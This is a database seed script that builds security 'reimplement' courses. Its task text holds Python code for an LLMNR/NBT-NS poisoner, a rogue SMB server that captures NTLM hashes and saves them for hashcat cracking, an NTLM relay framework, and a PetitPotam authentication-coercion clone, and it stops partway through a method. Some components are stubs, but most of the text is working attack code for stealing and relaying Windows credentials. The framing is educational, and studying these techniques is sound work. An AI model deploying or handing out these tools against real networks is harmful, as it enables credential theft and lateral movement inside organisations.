#!/usr/bin/env npx tsx
/**
 * Seed: Network Attack Tools
 * Responder, ntlmrelayx, mitm6, Coercer
 */

import Database from 'better-sqlite3';
import { join } from 'path';

const db = new Database(join(process.cwd(), 'data', 'quest-log.db'));
const now = Date.now();

const insertPath = db.prepare(`
	INSERT INTO paths (name, description, color, language, difficulty, estimated_weeks, skills, created_at)
	VALUES (?, ?, ?, ?, ?, ?, ?, ?)
`);

const insertModule = db.prepare(`
	INSERT INTO modules (path_id, name, description, order_index, created_at)
	VALUES (?, ?, ?, ?, ?)
`);

const insertTask = db.prepare(`
	INSERT INTO tasks (module_id, title, description, details, order_index, created_at)
	VALUES (?, ?, ?, ?, ?, ?)
`);

// ============================================================================
// RESPONDER REIMPLEMENTATION
// ============================================================================
const responderPath = insertPath.run(
	'Reimplement: Responder (LLMNR/NBT-NS)',
	'Build a network poisoner like Responder. Capture NTLM hashes via LLMNR, NBT-NS, and MDNS poisoning with rogue authentication servers.',
	'orange',
	'Python',
	'intermediate',
	8,
	'LLMNR, NBT-NS, MDNS, NTLM, SMB, HTTP, poisoning, MITM',
	now
);

const respMod1 = insertModule.run(responderPath.lastInsertRowid, 'Protocol Poisoning', 'LLMNR and NBT-NS poisoning', 0, now);

insertTask.run(respMod1.lastInsertRowid, 'Build LLMNR Poisoner', 'Intercept and respond to Link-Local Multicast Name Resolution (LLMNR) broadcast queries on UDP port 5355, poisoning name resolution to redirect authentication attempts and capture NTLM challenge-response hashes', `## LLMNR Poisoner

### Overview
Link-Local Multicast Name Resolution (LLMNR) poisoning to capture credentials.

### Python Implementation
\`\`\`python
#!/usr/bin/env python3
"""
LLMNR Poisoner
Respond to LLMNR queries with attacker IP
"""

import socket
import struct
import threading
from typing import Optional, Callable
from dataclasses import dataclass


@dataclass
class LLMNRQuery:
    transaction_id: int
    name: str
    query_type: int
    source_ip: str
    source_port: int


class LLMNRPoisoner:
    """
    LLMNR Poisoner - responds to multicast name queries
    LLMNR uses UDP port 5355, multicast 224.0.0.252
    """

    LLMNR_PORT = 5355
    LLMNR_MULTICAST = '224.0.0.252'

    def __init__(self, interface_ip: str, spoof_ip: str = None):
        self.interface_ip = interface_ip
        self.spoof_ip = spoof_ip or interface_ip
        self.running = False
        self.callback: Optional[Callable] = None

    def start(self, callback: Callable = None):
        """Start LLMNR poisoner"""

        self.callback = callback
        self.running = True

        # Create UDP socket
        self.sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        self.sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)

        # Bind to LLMNR port
        self.sock.bind(('', self.LLMNR_PORT))

        # Join multicast group
        mreq = struct.pack('4s4s',
            socket.inet_aton(self.LLMNR_MULTICAST),
            socket.inet_aton(self.interface_ip)
        )
        self.sock.setsockopt(socket.IPPROTO_IP, socket.IP_ADD_MEMBERSHIP, mreq)

        print(f"[*] LLMNR Poisoner started on {self.interface_ip}")
        print(f"[*] Spoofing responses with {self.spoof_ip}")

        # Listen for queries
        while self.running:
            try:
                data, addr = self.sock.recvfrom(1024)
                query = self._parse_query(data, addr)

                if query:
                    self._handle_query(query)

            except Exception as e:
                if self.running:
                    print(f"[-] Error: {e}")

    def stop(self):
        """Stop poisoner"""
        self.running = False
        self.sock.close()

    def _parse_query(self, data: bytes, addr: tuple) -> Optional[LLMNRQuery]:
        """Parse LLMNR query packet"""

        if len(data) < 12:
            return None

        # LLMNR header (same as DNS)
        transaction_id = struct.unpack('>H', data[0:2])[0]
        flags = struct.unpack('>H', data[2:4])[0]

        # Check if it's a query (QR bit = 0)
        if flags & 0x8000:
            return None  # It's a response, ignore

        # Parse question section
        offset = 12
        name_parts = []

        while offset < len(data):
            length = data[offset]
            if length == 0:
                offset += 1
                break

            name_parts.append(data[offset+1:offset+1+length].decode('utf-8', errors='ignore'))
            offset += length + 1

        if offset + 4 > len(data):
            return None

        query_type = struct.unpack('>H', data[offset:offset+2])[0]
        name = '.'.join(name_parts)

        return LLMNRQuery(
            transaction_id=transaction_id,
            name=name,
            query_type=query_type,
            source_ip=addr[0],
            source_port=addr[1]
        )

    def _handle_query(self, query: LLMNRQuery):
        """Handle LLMNR query and send poisoned response"""

        print(f"[+] LLMNR Query: {query.name} from {query.source_ip}")

        if self.callback:
            self.callback(query)

        # Build response
        response = self._build_response(query)

        # Send to requester
        self.sock.sendto(response, (query.source_ip, query.source_port))

        print(f"[+] Poisoned response sent ({self.spoof_ip})")

    def _build_response(self, query: LLMNRQuery) -> bytes:
        """Build LLMNR response packet"""

        response = bytearray()

        # Transaction ID
        response += struct.pack('>H', query.transaction_id)

        # Flags: Response, Authoritative
        response += struct.pack('>H', 0x8000)

        # Questions: 1, Answers: 1
        response += struct.pack('>HHHH', 1, 1, 0, 0)

        # Question section (copy from query)
        name_encoded = self._encode_name(query.name)
        response += name_encoded
        response += struct.pack('>HH', query.query_type, 1)  # Type, Class IN

        # Answer section
        response += name_encoded
        response += struct.pack('>HH', query.query_type, 1)  # Type, Class IN
        response += struct.pack('>I', 30)  # TTL

        # RDATA
        if query.query_type == 1:  # A record
            response += struct.pack('>H', 4)  # Length
            response += socket.inet_aton(self.spoof_ip)
        elif query.query_type == 28:  # AAAA record
            response += struct.pack('>H', 16)
            response += socket.inet_pton(socket.AF_INET6, '::1')

        return bytes(response)

    def _encode_name(self, name: str) -> bytes:
        """Encode DNS/LLMNR name"""

        encoded = bytearray()
        for part in name.split('.'):
            encoded += bytes([len(part)])
            encoded += part.encode()
        encoded += b'\\x00'
        return bytes(encoded)


class NBTNSPoisoner:
    """
    NetBIOS Name Service Poisoner
    UDP port 137, broadcast queries
    """

    NBNS_PORT = 137

    def __init__(self, interface_ip: str, spoof_ip: str = None):
        self.interface_ip = interface_ip
        self.spoof_ip = spoof_ip or interface_ip
        self.running = False

    def start(self, callback: Callable = None):
        """Start NBT-NS poisoner"""

        self.callback = callback
        self.running = True

        self.sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        self.sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self.sock.setsockopt(socket.SOL_SOCKET, socket.SO_BROADCAST, 1)

        self.sock.bind(('', self.NBNS_PORT))

        print(f"[*] NBT-NS Poisoner started on {self.interface_ip}")

        while self.running:
            try:
                data, addr = self.sock.recvfrom(1024)
                self._handle_packet(data, addr)
            except Exception as e:
                if self.running:
                    print(f"[-] NBT-NS Error: {e}")

    def _handle_packet(self, data: bytes, addr: tuple):
        """Handle NBT-NS packet"""

        if len(data) < 12:
            return

        # Parse NBT-NS header
        trans_id = struct.unpack('>H', data[0:2])[0]
        flags = struct.unpack('>H', data[2:4])[0]

        # Check if query
        if flags & 0x8000:
            return

        # Parse name
        name = self._decode_netbios_name(data[12:46])

        print(f"[+] NBT-NS Query: {name} from {addr[0]}")

        if self.callback:
            self.callback(name, addr)

        # Send poisoned response
        response = self._build_response(trans_id, data[12:46])
        self.sock.sendto(response, addr)

        print(f"[+] NBT-NS Poisoned ({self.spoof_ip})")

    def _decode_netbios_name(self, data: bytes) -> str:
        """Decode NetBIOS name encoding"""

        # Skip length byte
        name = ''
        for i in range(1, 33, 2):
            if i >= len(data):
                break
            high = data[i] - 0x41
            low = data[i+1] - 0x41
            char = chr((high << 4) | low)
            name += char

        return name.strip()

    def _build_response(self, trans_id: int, name_data: bytes) -> bytes:
        """Build NBT-NS response"""

        response = bytearray()

        # Transaction ID
        response += struct.pack('>H', trans_id)

        # Flags: Response, Authoritative
        response += struct.pack('>H', 0x8500)

        # Counts
        response += struct.pack('>HHHH', 0, 1, 0, 0)

        # Name
        response += name_data

        # TTL
        response += struct.pack('>I', 300)

        # Data length
        response += struct.pack('>H', 6)

        # Flags + IP
        response += struct.pack('>H', 0)
        response += socket.inet_aton(self.spoof_ip)

        return bytes(response)


class MDNSPoisoner:
    """
    Multicast DNS Poisoner
    UDP port 5353, multicast 224.0.0.251
    """

    MDNS_PORT = 5353
    MDNS_MULTICAST = '224.0.0.251'

    def __init__(self, interface_ip: str, spoof_ip: str = None):
        self.interface_ip = interface_ip
        self.spoof_ip = spoof_ip or interface_ip
        self.running = False

    def start(self, callback: Callable = None):
        """Start mDNS poisoner"""

        self.running = True

        self.sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        self.sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)

        self.sock.bind(('', self.MDNS_PORT))

        # Join multicast
        mreq = struct.pack('4s4s',
            socket.inet_aton(self.MDNS_MULTICAST),
            socket.inet_aton(self.interface_ip)
        )
        self.sock.setsockopt(socket.IPPROTO_IP, socket.IP_ADD_MEMBERSHIP, mreq)

        print(f"[*] mDNS Poisoner started")

        # Similar handling to LLMNR
        while self.running:
            try:
                data, addr = self.sock.recvfrom(1024)
                # Parse and respond
            except:
                pass


class Responder:
    """
    Main Responder class - coordinates all poisoners
    """

    def __init__(self, interface_ip: str, spoof_ip: str = None):
        self.interface_ip = interface_ip
        self.spoof_ip = spoof_ip or interface_ip

        self.llmnr = LLMNRPoisoner(interface_ip, spoof_ip)
        self.nbtns = NBTNSPoisoner(interface_ip, spoof_ip)
        self.mdns = MDNSPoisoner(interface_ip, spoof_ip)

        self.captured_hashes = []

    def start(self):
        """Start all poisoners"""

        print(f"\\n[*] Responder started")
        print(f"[*] Interface: {self.interface_ip}")
        print(f"[*] Spoof IP: {self.spoof_ip}\\n")

        threads = [
            threading.Thread(target=self.llmnr.start, daemon=True),
            threading.Thread(target=self.nbtns.start, daemon=True),
            threading.Thread(target=self.mdns.start, daemon=True),
        ]

        for t in threads:
            t.start()

        # Keep main thread alive
        try:
            while True:
                import time
                time.sleep(1)
        except KeyboardInterrupt:
            print("\\n[*] Stopping...")
            self.stop()

    def stop(self):
        """Stop all poisoners"""
        self.llmnr.running = False
        self.nbtns.running = False
        self.mdns.running = False


if __name__ == '__main__':
    import argparse

    parser = argparse.ArgumentParser(description='Responder Clone')
    parser.add_argument('-i', '--interface', required=True, help='Interface IP')
    parser.add_argument('-s', '--spoof', help='IP to spoof in responses')

    args = parser.parse_args()

    responder = Responder(args.interface, args.spoof)
    responder.start()
\`\`\`
`, 0, now);

insertTask.run(respMod1.lastInsertRowid, 'Build Rogue SMB Server', 'Implement a malicious SMB server that captures NTLMv1/v2 authentication hashes when clients connect, supporting SMBv1-3 protocol negotiation and NTLMSSP authentication message extraction for offline cracking', `## Rogue SMB Server

### Overview
Capture NTLM hashes when clients connect to our rogue SMB server.

### Python Implementation
\`\`\`python
#!/usr/bin/env python3
"""
Rogue SMB Server for NTLM Hash Capture
"""

import socket
import struct
import threading
from typing import Optional
from dataclasses import dataclass


@dataclass
class NTLMHash:
    username: str
    domain: str
    client_ip: str
    lm_response: bytes
    nt_response: bytes
    server_challenge: bytes


class RogueSMBServer:
    """
    Rogue SMB server that captures NTLM authentication
    """

    SMB_PORT = 445

    # SMB Commands
    SMB_COM_NEGOTIATE = 0x72
    SMB_COM_SESSION_SETUP = 0x73

    def __init__(self, bind_ip: str = '0.0.0.0'):
        self.bind_ip = bind_ip
        self.running = False
        self.hashes = []
        self.server_challenge = b'\\x11\\x22\\x33\\x44\\x55\\x66\\x77\\x88'

    def start(self):
        """Start SMB server"""

        self.running = True
        self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self.sock.bind((self.bind_ip, self.SMB_PORT))
        self.sock.listen(5)

        print(f"[*] Rogue SMB server listening on {self.bind_ip}:{self.SMB_PORT}")

        while self.running:
            try:
                client, addr = self.sock.accept()
                print(f"[+] Connection from {addr[0]}")
                threading.Thread(
                    target=self._handle_client,
                    args=(client, addr),
                    daemon=True
                ).start()
            except:
                pass

    def _handle_client(self, client: socket.socket, addr: tuple):
        """Handle SMB client connection"""

        try:
            while True:
                # Receive NetBIOS session header + SMB
                data = client.recv(4096)
                if not data:
                    break

                # Parse NetBIOS header
                if len(data) < 4:
                    break

                msg_type = data[0]
                length = struct.unpack('>I', b'\\x00' + data[1:4])[0]

                # Parse SMB header
                if len(data) < 36 or data[4:8] != b'\\xffSMB':
                    # Try SMB2
                    if data[4:8] == b'\\xfeSMB':
                        self._handle_smb2(client, data, addr)
                        continue
                    break

                command = data[8]

                if command == self.SMB_COM_NEGOTIATE:
                    response = self._build_negotiate_response()
                    client.send(response)

                elif command == self.SMB_COM_SESSION_SETUP:
                    ntlm_hash = self._parse_session_setup(data, addr)
                    if ntlm_hash:
                        self._save_hash(ntlm_hash)

                    # Send auth failure to try again or disconnect
                    response = self._build_session_response_error()
                    client.send(response)

        except Exception as e:
            print(f"[-] Client error: {e}")
        finally:
            client.close()

    def _handle_smb2(self, client: socket.socket, data: bytes, addr: tuple):
        """Handle SMB2/3 connections"""

        # SMB2 header at offset 4
        if len(data) < 68:
            return

        command = struct.unpack('<H', data[16:18])[0]

        if command == 0:  # NEGOTIATE
            response = self._build_smb2_negotiate_response()
            client.send(response)

        elif command == 1:  # SESSION_SETUP
            ntlm_hash = self._parse_smb2_session_setup(data, addr)
            if ntlm_hash:
                self._save_hash(ntlm_hash)

    def _build_negotiate_response(self) -> bytes:
        """Build SMB NEGOTIATE response with NTLM challenge"""

        response = bytearray()

        # NetBIOS header
        response += b'\\x00'  # Message type
        response += b'\\x00\\x00\\x00'  # Length placeholder

        # SMB header
        response += b'\\xffSMB'  # Protocol
        response += bytes([self.SMB_COM_NEGOTIATE])  # Command
        response += struct.pack('<I', 0)  # Status
        response += bytes([0x98])  # Flags
        response += struct.pack('<H', 0xc853)  # Flags2
        response += bytes(12)  # PID, UID, MID, etc.

        # NEGOTIATE response
        response += struct.pack('<H', 0)  # Dialect index
        response += bytes([0x03])  # Security mode
        response += struct.pack('<H', 1)  # Max MPX
        response += struct.pack('<H', 1)  # Max VCs
        response += struct.pack('<I', 16644)  # Max buffer
        response += struct.pack('<I', 65536)  # Max raw
        response += struct.pack('<I', 0)  # Session key
        response += struct.pack('<I', 0xf3fd)  # Capabilities

        # System time
        response += bytes(8)

        # Server timezone
        response += struct.pack('<h', 0)

        # Challenge length
        response += bytes([8])

        # Security blob (NTLMSSP CHALLENGE)
        ntlmssp = self._build_ntlmssp_challenge()
        response += struct.pack('<H', len(ntlmssp))
        response += ntlmssp

        # Update length
        length = len(response) - 4
        response[1:4] = struct.pack('>I', length)[1:]

        return bytes(response)

    def _build_ntlmssp_challenge(self) -> bytes:
        """Build NTLMSSP CHALLENGE message"""

        challenge = bytearray()

        # Signature
        challenge += b'NTLMSSP\\x00'

        # Message type (2 = Challenge)
        challenge += struct.pack('<I', 2)

        # Target name
        target_name = 'WORKGROUP'.encode('utf-16-le')
        target_offset = 56

        challenge += struct.pack('<HH', len(target_name), len(target_name))
        challenge += struct.pack('<I', target_offset)

        # Negotiate flags
        flags = 0xe2898215
        challenge += struct.pack('<I', flags)

        # Server challenge
        challenge += self.server_challenge

        # Reserved
        challenge += bytes(8)

        # Target info
        target_info = self._build_target_info()
        target_info_offset = target_offset + len(target_name)

        challenge += struct.pack('<HH', len(target_info), len(target_info))
        challenge += struct.pack('<I', target_info_offset)

        # Version (optional)
        challenge += bytes(8)

        # Target name data
        challenge += target_name

        # Target info data
        challenge += target_info

        return bytes(challenge)

    def _build_target_info(self) -> bytes:
        """Build NTLMSSP target info"""

        info = bytearray()

        # NetBIOS domain name
        domain = 'WORKGROUP'.encode('utf-16-le')
        info += struct.pack('<HH', 2, len(domain))
        info += domain

        # NetBIOS computer name
        computer = 'WIN-SERVER'.encode('utf-16-le')
        info += struct.pack('<HH', 1, len(computer))
        info += computer

        # End
        info += struct.pack('<HH', 0, 0)

        return bytes(info)

    def _parse_session_setup(self, data: bytes, addr: tuple) -> Optional[NTLMHash]:
        """Parse SESSION_SETUP_ANDX and extract NTLM response"""

        # Find NTLMSSP signature
        ntlmssp_offset = data.find(b'NTLMSSP\\x00')
        if ntlmssp_offset == -1:
            return None

        ntlmssp = data[ntlmssp_offset:]

        # Check message type
        msg_type = struct.unpack('<I', ntlmssp[8:12])[0]

        if msg_type != 3:  # Not AUTHENTICATE
            return None

        # Parse AUTHENTICATE message
        lm_len = struct.unpack('<H', ntlmssp[12:14])[0]
        lm_offset = struct.unpack('<I', ntlmssp[16:20])[0]

        nt_len = struct.unpack('<H', ntlmssp[20:22])[0]
        nt_offset = struct.unpack('<I', ntlmssp[24:28])[0]

        domain_len = struct.unpack('<H', ntlmssp[28:30])[0]
        domain_offset = struct.unpack('<I', ntlmssp[32:36])[0]

        user_len = struct.unpack('<H', ntlmssp[36:38])[0]
        user_offset = struct.unpack('<I', ntlmssp[40:44])[0]

        # Extract values
        lm_response = ntlmssp[lm_offset:lm_offset+lm_len]
        nt_response = ntlmssp[nt_offset:nt_offset+nt_len]
        domain = ntlmssp[domain_offset:domain_offset+domain_len].decode('utf-16-le', errors='ignore')
        username = ntlmssp[user_offset:user_offset+user_len].decode('utf-16-le', errors='ignore')

        return NTLMHash(
            username=username,
            domain=domain,
            client_ip=addr[0],
            lm_response=lm_response,
            nt_response=nt_response,
            server_challenge=self.server_challenge
        )

    def _save_hash(self, ntlm_hash: NTLMHash):
        """Save captured hash"""

        self.hashes.append(ntlm_hash)

        # Format for hashcat
        if len(ntlm_hash.nt_response) > 24:
            # NTLMv2
            nt_proof = ntlm_hash.nt_response[:16]
            nt_blob = ntlm_hash.nt_response[16:]

            hash_str = (
                f"{ntlm_hash.username}::{ntlm_hash.domain}:"
                f"{self.server_challenge.hex()}:"
                f"{nt_proof.hex()}:{nt_blob.hex()}"
            )
            print(f"\\n[+] NTLMv2 Hash captured!")
        else:
            # NTLMv1
            hash_str = (
                f"{ntlm_hash.username}::{ntlm_hash.domain}:"
                f"{ntlm_hash.lm_response.hex()}:"
                f"{ntlm_hash.nt_response.hex()}:"
                f"{self.server_challenge.hex()}"
            )
            print(f"\\n[+] NTLMv1 Hash captured!")

        print(f"    User: {ntlm_hash.domain}\\\\{ntlm_hash.username}")
        print(f"    From: {ntlm_hash.client_ip}")
        print(f"    Hash: {hash_str}\\n")

        # Save to file
        with open('captured_hashes.txt', 'a') as f:
            f.write(hash_str + '\\n')

    def _build_session_response_error(self) -> bytes:
        """Build SESSION_SETUP error response"""

        response = bytearray()

        # NetBIOS header
        response += b'\\x00\\x00\\x00\\x23'

        # SMB header
        response += b'\\xffSMB'
        response += bytes([self.SMB_COM_SESSION_SETUP])
        response += struct.pack('<I', 0xc000006d)  # STATUS_LOGON_FAILURE
        response += bytes([0x98])
        response += struct.pack('<H', 0xc803)
        response += bytes(18)

        return bytes(response)

    def _build_smb2_negotiate_response(self) -> bytes:
        """Build SMB2 NEGOTIATE response"""
        # Simplified SMB2 negotiate response
        return b''

    def _parse_smb2_session_setup(self, data: bytes, addr: tuple) -> Optional[NTLMHash]:
        """Parse SMB2 SESSION_SETUP"""
        return self._parse_session_setup(data, addr)


if __name__ == '__main__':
    server = RogueSMBServer()
    server.start()
\`\`\`

### Hash Cracking
\`\`\`bash
# NTLMv2
hashcat -m 5600 captured_hashes.txt wordlist.txt

# NTLMv1
hashcat -m 5500 captured_hashes.txt wordlist.txt
\`\`\`
`, 1, now);

// ============================================================================
// NTLM RELAY
// ============================================================================
const relayPath = insertPath.run(
	'Reimplement: ntlmrelayx',
	'Build an NTLM relay tool. Relay captured authentication to other services for lateral movement without cracking passwords.',
	'red',
	'Python',
	'advanced',
	10,
	'NTLM, relay, SMB, LDAP, HTTP, lateral movement',
	now
);

const relayMod1 = insertModule.run(relayPath.lastInsertRowid, 'NTLM Relay Core', 'Relay authentication to targets', 0, now);

insertTask.run(relayMod1.lastInsertRowid, 'Build NTLM Relay Framework', 'Forward captured NTLM authentication messages to target services in real-time, acting as a man-in-the-middle to authenticate as the victim to SMB, HTTP, LDAP, MSSQL, or other NTLM-capable services without cracking passwords', `## NTLM Relay Framework

### Overview
Relay NTLM authentication to other hosts instead of cracking hashes.

### Python Implementation
\`\`\`python
#!/usr/bin/env python3
"""
NTLM Relay Framework
Relay authentication to SMB, LDAP, HTTP targets
"""

import socket
import struct
import threading
from typing import List, Dict, Optional
from dataclasses import dataclass
from queue import Queue


@dataclass
class RelayTarget:
    host: str
    port: int
    protocol: str  # smb, ldap, http


@dataclass
class RelaySession:
    source_ip: str
    target: RelayTarget
    ntlmssp_negotiate: bytes
    ntlmssp_challenge: bytes
    ntlmssp_authenticate: bytes


class NTLMRelayServer:
    """
    NTLM Relay Server
    Captures auth and relays to targets
    """

    def __init__(self, targets: List[RelayTarget]):
        self.targets = targets
        self.current_target_idx = 0
        self.sessions: Dict[str, RelaySession] = {}
        self.auth_queue = Queue()

    def get_next_target(self) -> RelayTarget:
        """Round-robin target selection"""
        target = self.targets[self.current_target_idx]
        self.current_target_idx = (self.current_target_idx + 1) % len(self.targets)
        return target

    def start_smb_server(self, port: int = 445):
        """Start SMB server to capture auth"""

        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        sock.bind(('0.0.0.0', port))
        sock.listen(5)

        print(f"[*] SMB Relay server on port {port}")

        while True:
            client, addr = sock.accept()
            threading.Thread(
                target=self._handle_smb_client,
                args=(client, addr),
                daemon=True
            ).start()

    def _handle_smb_client(self, client: socket.socket, addr: tuple):
        """Handle SMB client and relay auth"""

        target = self.get_next_target()
        print(f"[*] Client {addr[0]} -> Relaying to {target.host}:{target.port}")

        # Connect to target
        try:
            target_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            target_sock.connect((target.host, target.port))
        except Exception as e:
            print(f"[-] Failed to connect to target: {e}")
            client.close()
            return

        session = RelaySession(
            source_ip=addr[0],
            target=target,
            ntlmssp_negotiate=b'',
            ntlmssp_challenge=b'',
            ntlmssp_authenticate=b''
        )

        # Relay negotiate
        data = client.recv(4096)
        session.ntlmssp_negotiate = self._extract_ntlmssp(data)

        # Forward to target
        target_sock.send(data)

        # Get challenge from target
        challenge_data = target_sock.recv(4096)
        session.ntlmssp_challenge = self._extract_ntlmssp(challenge_data)

        # Send challenge to client
        client.send(challenge_data)

        # Get authenticate from client
        auth_data = client.recv(4096)
        session.ntlmssp_authenticate = self._extract_ntlmssp(auth_data)

        # Relay authenticate to target
        target_sock.send(auth_data)

        # Get result
        result = target_sock.recv(4096)

        if self._check_auth_success(result):
            print(f"[+] Relay successful! Authenticated to {target.host}")

            # Now we have an authenticated session to target
            self._post_relay_action(target_sock, target)
        else:
            print(f"[-] Relay failed to {target.host}")

        client.close()
        target_sock.close()

    def _extract_ntlmssp(self, data: bytes) -> bytes:
        """Extract NTLMSSP blob from packet"""
        offset = data.find(b'NTLMSSP\\x00')
        if offset == -1:
            return b''

        # Find end of NTLMSSP (varies by message type)
        return data[offset:]

    def _check_auth_success(self, data: bytes) -> bool:
        """Check if authentication succeeded"""

        # SMB: Check status code
        if b'\\xffSMB' in data or b'\\xfeSMB' in data:
            # Find status
            if b'\\xffSMB' in data:
                offset = data.find(b'\\xffSMB')
                status = struct.unpack('<I', data[offset+9:offset+13])[0]
            else:
                offset = data.find(b'\\xfeSMB')
                status = struct.unpack('<I', data[offset+12:offset+16])[0]

            return status == 0

        return False

    def _post_relay_action(self, sock: socket.socket, target: RelayTarget):
        """Action after successful relay"""

        if target.protocol == 'smb':
            self._smb_post_relay(sock, target)
        elif target.protocol == 'ldap':
            self._ldap_post_relay(sock, target)

    def _smb_post_relay(self, sock: socket.socket, target: RelayTarget):
        """Post-relay actions for SMB"""

        print(f"[*] Executing post-relay actions on {target.host}")

        # Options:
        # 1. Dump SAM hashes (secretsdump)
        # 2. Execute command (psexec)
        # 3. Deploy payload
        # 4. Access shares

        # Example: List shares
        # This would require implementing SMB TREE_CONNECT etc.
        pass

    def _ldap_post_relay(self, sock: socket.socket, target: RelayTarget):
        """Post-relay actions for LDAP"""

        print(f"[*] LDAP relay actions on {target.host}")

        # Options:
        # 1. Add computer account (RBCD attack)
        # 2. Modify ACLs
        # 3. Add user to group
        # 4. Set SPN (targeted kerberoast)
        pass


class SMBRelayClient:
    """Client to connect to SMB targets for relay"""

    def __init__(self, host: str, port: int = 445):
        self.host = host
        self.port = port
        self.sock = None

    def connect(self):
        self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.sock.connect((self.host, self.port))

    def negotiate(self) -> bytes:
        """Send SMB negotiate and get challenge"""

        # Build NEGOTIATE
        negotiate = self._build_negotiate()
        self.sock.send(negotiate)

        return self.sock.recv(4096)

    def authenticate(self, ntlmssp_auth: bytes) -> bytes:
        """Send authentication and get result"""

        # Build SESSION_SETUP with auth
        session_setup = self._build_session_setup(ntlmssp_auth)
        self.sock.send(session_setup)

        return self.sock.recv(4096)

    def _build_negotiate(self) -> bytes:
        """Build SMB NEGOTIATE request"""
        # Simplified SMB negotiate
        return b''

    def _build_session_setup(self, ntlmssp: bytes) -> bytes:
        """Build SMB SESSION_SETUP with NTLMSSP"""
        return b''


class LDAPRelayClient:
    """Client for LDAP relay"""

    def __init__(self, host: str, port: int = 389):
        self.host = host
        self.port = port

    def bind_ntlm(self, ntlmssp: bytes) -> bool:
        """LDAP bind with NTLM"""
        # Implement LDAP SASL bind with NTLMSSP
        return False

    def add_computer(self, name: str, password: str) -> bool:
        """Add computer account for RBCD"""
        return False

    def modify_dacl(self, dn: str, ace: bytes) -> bool:
        """Modify object DACL"""
        return False


def main():
    import argparse

    parser = argparse.ArgumentParser(description='NTLM Relay')
    parser.add_argument('-t', '--targets', required=True, help='Target file or single host')
    parser.add_argument('-smb', action='store_true', help='Start SMB server')
    parser.add_argument('-http', action='store_true', help='Start HTTP server')
    parser.add_argument('-c', '--command', help='Command to execute')
    parser.add_argument('--dump', action='store_true', help='Dump secrets')

    args = parser.parse_args()

    # Parse targets
    targets = []
    if ':' in args.targets:
        host, port = args.targets.rsplit(':', 1)
        targets.append(RelayTarget(host, int(port), 'smb'))
    else:
        targets.append(RelayTarget(args.targets, 445, 'smb'))

    relay = NTLMRelayServer(targets)

    if args.smb:
        relay.start_smb_server()


if __name__ == '__main__':
    main()
\`\`\`

### Attack Scenarios
1. **SMB to SMB** - Relay to another Windows machine
2. **SMB to LDAP** - Modify AD (add computer, change ACL)
3. **HTTP to SMB** - Capture from web, relay to SMB
4. **LDAP to LDAP** - Relay LDAP auth
`, 0, now);

// ============================================================================
// COERCION TOOLS
// ============================================================================
const coercerPath = insertPath.run(
	'Reimplement: Authentication Coercion',
	'Build authentication coercion tools like PetitPotam and Coercer. Force Windows machines to authenticate to attacker-controlled servers.',
	'pink',
	'Python',
	'intermediate',
	6,
	'MSRPC, EfsRpcOpenFileRaw, PrinterBug, coercion, NTLM',
	now
);

const coercerMod1 = insertModule.run(coercerPath.lastInsertRowid, 'Coercion Techniques', 'Force authentication via RPC', 0, now);

insertTask.run(coercerMod1.lastInsertRowid, 'Build PetitPotam Clone', 'Exploit the MS-EFSRPC protocol by calling EfsRpcOpenFileRaw with a UNC path pointing to an attacker-controlled server, coercing the target machine to authenticate and enabling NTLM relay attacks against domain controllers', `## PetitPotam Implementation

### Overview
Abuse MS-EFSRPC to coerce Windows machines to authenticate.

### Python Implementation
\`\`\`python
#!/usr/bin/env python3
"""
PetitPotam Clone
MS-EFSRPC Authentication Coercion
"""

from impacket.dcerpc.v5 import transport, epm
from impacket.dcerpc.v5.rpcrt import RPC_C_AUTHN_WINNT, RPC_C_AUTHN_LEVEL_PKT_PRIVACY
from impacket.uuid import uuidtup_to_bin
import struct


class PetitPotam:
    """
    MS-EFSRPC Coercion
    Forces target to authenticate to listener
    """

    # MS-EFSRPC UUID
    EFSRPC_UUID = ('c681d488-d850-11d0-8c52-00c04fd90f7e', '1.0')

    # Named pipes for EFSRPC
    PIPES = [
        'lsarpc',
        'efsrpc',
        'lsass',
        'netlogon',
        'samr',
    ]

    def __init__(self, target: str, listener: str):
        self.target = target
        self.listener = listener
        self.dce = None

    def connect(self, username: str = '', password: str = '',
                domain: str = '', pipe: str = 'lsarpc') -> bool:
        """Connect to target via named pipe"""

        string_binding = f"ncacn_np:{self.target}[\\\\pipe\\\\{pipe}]"

        try:
            rpc_transport = transport.DCERPCTransportFactory(string_binding)

            if username:
                rpc_transport.set_credentials(username, password, domain)

            self.dce = rpc_transport.get_dce_rpc()
            self.dce.connect()
            self.dce.bind(uuidtup_to_bin(self.EFSRPC_UUID))

            print(f"[+] Connected to {self.target} via {pipe}")
            return True

        except Exception as e:
            print(f"[-] Connection failed: {e}")
            return False

    def coerce_efs_rpc_open_file_raw(self) -> bool:
        """
        EfsRpcOpenFileRaw - Most common method
        Opnum: 0
        """

        print(f"[*] Triggering EfsRpcOpenFileRaw...")

        # UNC path to listener
        unc_path = f"\\\\\\\\{self.listener}\\\\share\\\\file.txt"

        # Build request
        request = self._build_open_file_raw_request(unc_path)

        try:
            self.dce.call(0, request)  # Opnum 0
            print("[+] Coercion triggered!")
            return True
        except Exception as e:
            # Expected to fail, but coercion may still work
            if 'rpc_s_access_denied' in str(e).lower():
                print("[+] Access denied but coercion may have worked")
                return True
            print(f"[-] Coercion failed: {e}")
            return False

    def coerce_efs_rpc_encrypt_file_srv(self) -> bool:
        """
        EfsRpcEncryptFileSrv
        Opnum: 4
        """

        print(f"[*] Triggering EfsRpcEncryptFileSrv...")

        unc_path = f"\\\\\\\\{self.listener}\\\\share\\\\file.txt"
        request = self._build_encrypt_file_request(unc_path)

        try:
            self.dce.call(4, request)
            return True
        except Exception as e:
            if 'rpc_s_access_denied' in str(e).lower():
                return True
            return False

    def coerce_efs_rpc_decrypt_file_srv(self) -> bool:
        """
        EfsRpcDecryptFileSrv
        Opnum: 5
        """

